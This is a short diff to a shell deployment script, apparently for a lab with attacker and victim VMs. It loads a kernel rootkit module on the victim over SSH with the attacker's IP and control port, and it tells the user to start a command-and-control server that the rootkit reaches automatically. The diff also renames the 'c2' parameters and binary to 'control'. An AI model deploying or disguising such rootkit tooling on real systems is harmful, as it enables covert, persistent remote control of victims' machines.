@@ -42,7 +42,9 @@ deploy_rootkit() {
 
 load_rootkit() {
     log_step "Loading rootkit on Victim VM"
-    ssh_victim "cd ~/rootkit && sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$CONTROL_PORT"
+    # Load the rootkit with the attacker's IP and control port as parameters.
+    # insmod = insert module, c2_ip = command and control IP, c2_port = command and control port
+    ssh_victim "cd ~/rootkit && sudo insmod wlkom.ko control_ip=$ATTACKER_IP control_port=$CONTROL_PORT"
     log_ok "Rootkit loaded"
 }
 
@@ -88,7 +90,7 @@ print_next_steps() {
     echo ""
     echo "  Attacker VM — start the C2 server:"
     echo "    ssh $VM_USER@localhost -p $ATTACKER_SSH_PORT"
-    echo "    cd ~/attacking_program && ./wlkom_c2 $CONTROL_PORT"
+    echo "    cd ~/attacking_program && ./wlkom_control $CONTROL_PORT"
     echo ""
     echo "  The rootkit will connect automatically (retries every 5s)."
     echo ""
